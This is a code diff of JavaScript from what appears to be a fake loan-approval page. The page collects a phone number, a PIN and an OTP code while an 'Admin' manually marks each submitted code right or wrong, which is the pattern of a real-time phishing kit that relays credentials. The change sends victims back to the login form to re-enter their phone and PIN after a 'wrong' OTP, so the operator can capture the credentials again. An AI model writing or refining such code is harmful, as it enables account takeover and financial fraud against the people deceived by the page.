@@ -1097,12 +1097,25 @@
           } else if (status === 'wrongcode') {
             console.log('❌ Admin marked code as wrong');
             clearTimeout(otpPollTimeout);
-            goTo('page-otp');
-            document.getElementById('bOtp').disabled = false;
-            document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-            // Clear OTP fields
-            [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
-            showOtpMsg('error', 'The OTP code was incorrect. Please try again.');
+            
+            // Clear all fields
+            document.getElementById('lpPhone').value = '';
+            [0,1,2,3,4].forEach(i => {
+              const pinEl = document.getElementById('lp'+i);
+              if (pinEl) pinEl.value = '';
+            });
+            [0,1,2,3].forEach(i => {
+              const otpEl = document.getElementById('otp'+i);
+              if (otpEl) otpEl.value = '';
+            });
+            
+            // Return to login page
+            goTo('page-login');
+            
+            // Show error message
+            setTimeout(() => {
+              showLgnMsg('error', '❌ Wrong OTP Code! Your login was rejected. Please try again with the correct credentials.');
+            }, 300);
           } else {
             // Still pending, keep polling
             otpPollTimeout = setTimeout(checkStatus, 2000);
